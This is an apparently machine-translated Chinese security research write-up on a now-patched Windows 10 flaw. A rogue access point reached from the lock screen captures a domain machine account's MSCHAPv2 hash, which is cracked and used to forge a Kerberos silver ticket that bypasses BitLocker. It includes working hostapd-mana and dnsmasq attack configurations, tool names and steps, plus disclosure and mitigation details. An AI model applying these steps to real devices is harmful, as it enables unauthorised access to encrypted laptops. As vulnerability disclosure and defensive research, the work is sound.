默认情况下，加入域的 Windows 工作站允许从锁定屏幕访问网络选择 UI。


对具有 WiFi 功能的锁定设备（例如笔记本电脑或工作站）进行物理访问的攻击者可以滥用此功能来强制笔记本电脑针对恶意接入点进行身份验证并捕获域计算机帐户的 MSCHAPv2 质询响应哈希。


然后可以将此质询响应散列提交到crack.sh以在不到24 小时内恢复计算机帐户的NTLM 散列。


一旦恢复，此 NTLM 哈希与域 SID 结合可用于伪造 Kerberos 银票以冒充特权用户并危害主机。一个例子是为膝上型电脑的 CIFS 服务创建一张银票，以便通过 SMB 作为 SYSTEM 用户进行身份验证并获得对硬盘的无限制访问。


由于可以从锁定的设备执行攻击，因此可以利用它绕过 BitLocker 全盘加密并访问设备文件系统。


此外，由于可以为特权用户伪造银票，因此也可以利用这种攻击将特权提升为设备本地管理员的特权。

受影响的版本

  • 该漏洞已确认存在于加入域的 Windows 10 主机上。

  • 旧版本的 Windows 也可能受到影响，但尚未经过测试。


背景

熟悉企业无线网络的人可能会熟悉受保护的可扩展身份验证协议 (PEAP)。


PEAP 是一种隧道身份验证协议，这意味着首先与 RADIUS 服务器建立 SSL 隧道（称为阶段 1），以保护身份验证（阶段 2）期间发送的凭据材料。


Windows 环境中最常用的内部身份验证方法之一是 MSCHAPv2。该MSCHAPv2的协议已经存在了很长一段时间，并有一些严重缺陷的密码，如莫克西·马林斯皮克和David Hulton在我所有的时间最喜欢的DEF CON会谈一个证明这里。


这项研究的高潮是crack.sh服务，它保证为任何给定的MSCHAPv2 质询响应散列（无论密码复杂性如何）恢复NTLM 散列。


在 Windows 环境中，当域用户使用带有 MSCHAPv2 的 PEAP 对无线接入点进行身份验证时，生成的质询响应哈希值来自域用户密码的 NTLM 哈希值。


除了域用户身份验证之外，Windows 还提供了使用机器/计算机身份验证的选项。这用于允许设备在域用户登录之前对无线网络进行身份验证。


需要计算机身份验证来解决当设备首先需要对网络进行身份验证才能访问 Active Directory 并对域用户进行身份验证时出现的“先有鸡还是先有蛋”的情况。为了为用户创造无缝体验，此身份验证在用户登录设备之前从锁定屏幕进行。


计算机身份验证可以使用客户端证书或 MSCHAPv2 作为其内部身份验证机制。在客户端证书的情况下，为域计算机帐户颁发的证书用于进行身份验证。但是如果计算机身份验证与 PEAP 和 MSCHAPv2 一起使用会发生什么？在这种情况下，域计算机帐户的 NTLM 哈希用于身份验证。


计算机帐户密码复杂、长且随机生成。我们永远无法恢复此帐户的纯文本密码，为什么这很重要？好吧，我们无法恢复纯文本密码，但多亏了crack.sh，我们可以恢复NTLM 哈希。


计算机帐户 NTLM 哈希在 Windows 域环境的上下文中具有特殊意义，因为它们与 Kerberos 银票相关。计算机托管的服务（例如 CIFS 服务）的 Kerberos 服务票证使用计算机帐户的 NTLM 哈希进行签名和加密。


为了伪造服务票，我们需要以下信息：

  • 计算机帐户的 NTLM 哈希

  • 我们想要访问的服务名称

  • 域 SID


一旦我们从crack.sh恢复了计算机帐户 NTLM 哈希，我们只需要域 SID，我们就可以伪造我们自己的票证。域 SID 不是秘密信息，任何普通域用户都可以检索到。


从域用户到本地管理员的权限提升

为了将此武器化，我们首先需要创建一个支持 PEAP 的恶意接入点，并将 MSSHAPV2 设置为内部身份验证方法。有很多工具可以实现这一点，这里我们使用的是hostapd-mana。


注意为了允许更高版本的 Windows 10 连接到访问点，RADIUS 服务器证书需要使用受信任的 CA 进行签名。如果不这样做，将导致 Windows 10 请求方出现模糊的“无法连接”错误。


在这里，我们使用 LetsEncrypt 通过以下命令来实现这一点（注意证书上的服务器名称无关紧要 - 它只需要由受信任的机构签名）。

# Generate LetsEncrypt certificatessudo snap install --classic certbotsudo certbot certonly --standalone -d radius.breakfix.co

生成证书后，我们将它们重命名以使其更适合我们的 hostapd 配置并生成 DH 参数。

# Rename certificates to work with hostapdcp /etc/letsencrypt/live/radius.breakfix.co/fullchain.pem ca.pemcp /etc/letsencrypt/live/radius.breakfix.co/privkey.pem server.keycp /etc/letsencrypt/live/radius.breakfix.co/cert.pem server.pem
# Generate DH paramsopenssl dhparam 2048 > dhparam.pem

然后我们创建一个“hostapd.conf”文件，内容如下

interface=$WIRELESS_INTERFACE_HEREssid=Airstrikehw_mode=gchannel=6

mana_wpe=1

和“hostapd.eap_user”文件，内容如下

*    PEAP,TTLS,TLS,MD5,GTC"t"       GTC,TTLS-MSCHAPV2,MSCHAPV2,MD5,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP  "1234test"  [2]

在此阶段，无线身份验证将失败，因为 MSCHAPv2 要求接入点也知道密码，但会捕获质询响应哈希。


恢复 NTLM 哈希

这个捕获的 MSCHAPv2 挑战响应哈希可以使用工具chapcrack转换为 Cloud Crack 格式，并提交到crack.sh进行破解。

对于POC的目的，在我们的实验室，我们使用的工具，secretsdump.py从Impacket来验证前4个字节K3的输出由chapcrack匹配最后4个字节的NTLM哈希的计算机帐户。

作为经过身份验证的域用户，我们可以通过多种不同方式获取域 SID。最简单的就是简单地运行whoami /all。

我们现在拥有为设备上的 CIFS 服务伪造一张银票所需的所有信息。因为我们可以指定包含在服务票据中的用户和组 SID，所以我们可以使用它作为管理用户访问 CIFS 服务。

使用 smbclient，我们现在可以访问笔记本电脑的整个文件系统。

smbexec.py来自Impacket 的工具提供了一种在 SYSTEM 用户的安全上下文下在主机上获得命令执行的简单方法。

拼图的缺失部分

在发现这种攻击几个月后，一位客户联系我们，让我们在他们的一台 SOE 笔记本电脑上进行测试。他们特别担心的是，如果攻击者能够拿到受 BitLocker 全盘加密保护的锁定笔记本电脑，可能会造成什么损害。


在提出这个特定场景后，我和我的同事 Danyal Drew ( @DanyalDrew ) 重新审视了这个想法，并着手看看我们是否可以找到一种无需登录机器就可以泄露域 SID 的方法。


当加入域的计算机首次访问网络时，会执行大量 CLDAP 搜索，以确定域控制器上可用的服务。这些消息称为LDAP ping。


这听起来很有希望，因为在此发现过程中使用的 CLDAP 查询包含以下信息：

  • 域名

  • 主持人

  • 主机名

  • 用户

  • 域标识符

  • 域向导

我们最初的测试包括运行 Wireshark 捕获和观察无线客户端发出的 LDAP DNS 请求。

将这些srv-hostDNS 条目添加到我们的 dnsmasq 配置并重新连接客户端后，我们找到了我们要找的东西。

有了这个，我们现在拥有了尝试闯入锁定的笔记本电脑所需的一切。


访问已启用全盘加密的锁定机器

可以使用相同的 rouge AP 配置从目标设备的锁屏中捕获质询响应哈希并提交到 crack.sh。


为了泄露域 SID，我们需要将笔记本电脑加入攻击者控制的网络，在那里我们将使用攻击者的 IP 地址响应笔记本电脑发出的所有 DNS SRV 请求。


这将允许我们捕获包含域 SID 和域名的“LDAP ping”数据包。再一次，我们将运行一个恶意接入点并强制客户端从锁定屏幕进行连接。然而，除了配置接入点支持PEAP认证，这一次我们将使用下面的一个WPA2-PSK网络hostapd.conf和hostapd-psk文件。

interface=$WIRELESS_INTERFACE_HEREssid=Airstrike_WPAchannel=1auth_algs=1wpa=3wpa_psk_file=./hostapd-pskwpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP TKIPrsn_pairwise=CCMP

并创建一个文件hostapd-psk来配置网络密码。00:00:00:00:00:00 airstrike


由于我们希望笔记本电脑连接到我们的网络，因此我们还需要使用dnsmasq以下dnsmasq.conf文件运行 DHCP 和 DNS 服务器。

interface=$WIRELESS_INTERFACE_HEREdhcp-range=10.0.0.10,10.0.0.100,8hdhcp-option=3,10.0.0.1dhcp-option=6,10.0.0.1server=8.8.8.8log-querieslog-dhcp

现在我们可以为我们的无线适配器分配一个 IP 地址并启动 DNS / DHCP 服务器。

ifconfig $WIRELESS_INTERFACE 10.0.0.1/24 updnsmasq -d -C dnsmasq.conf

为了捕获来自笔记本电脑的流量，我们还将在无线接口上启用 tcpdump。

tcpdump -i $WIRELESS_INTERFACE -s 65535 -w $OUT_FILE.pcap

运行后，我们可以从锁定屏幕连接到无线网络，并且应该会看到笔记本电脑从我们的 DHCP 服务器接收 IP。


当笔记本电脑第一次连接时，我们会看到一些不会被响应的 SRV DNS 请求。我们将记录其中的每一个并修改我们的dnsmasq.conf文件以使用我们的无线接入点的 IP 地址响应它们。

interface=$WIRELESS_INTERFACE_HEREdhcp-range=10.0.0.10,10.0.0.100,8hdhcp-option=3,10.0.0.1dhcp-option=6,10.0.0.1server=8.8.8.8log-querieslog-dhcp
srv-host=_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.INITECH.local,10.0.0.1,389srv-host=_ldap._tcp.dc._msdcs.INITECH.local,10.0.0.1,389srv-host=_ldap._tcp.a3fcc77a-710d-4956-af07-bfa9187b91e9.domains._msdcs.INITECH.local,10.0.0.1,389srv-host=_ldap._tcp.INITECH.local,10.0.0.1,389

我们现在可以从接入点断开并重新连接笔记本电脑，并检查我们新 pcap 文件的内容。如果我们根据CLDAP协议过滤数据包，我们可以看到笔记本电脑尝试LDAP ping攻击我们的攻击者 IP。LDAP ping 消息的内容包含 Active Directory 域名、膝上型计算机的主机名和域 SID。


我们可以再次使用该工具ticketer.py为 CIFS 服务创建一张银票，并使用该工具进行身份验证smbclient以不受限制地访问设备的文件系统。


注意：可能存在默认 RID 500 帐户在加入域的主机上没有本地管理员权限的情况。在这种情况下，可以通过增加包含在银票中的 RID 直到找到有效帐户来采取暴力方法。


修复

此问题已向 Microsoft 安全响应中心披露，并已在 2021 年 4 月的最新安全更新中得到解决。


作为进一步的强化措施，可以通过以下组策略设置禁用从锁定屏幕访问网络选择 UI 的功能。

Computer Configuration | Administrative Templates | System | Logon --> Do not display network selection UI

也可以通过启用该DontDisplayNetworkSelectionUI标志通过注册表配置此设置。

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]"DontDisplayNetworkSelectionUI"=dword:00000001
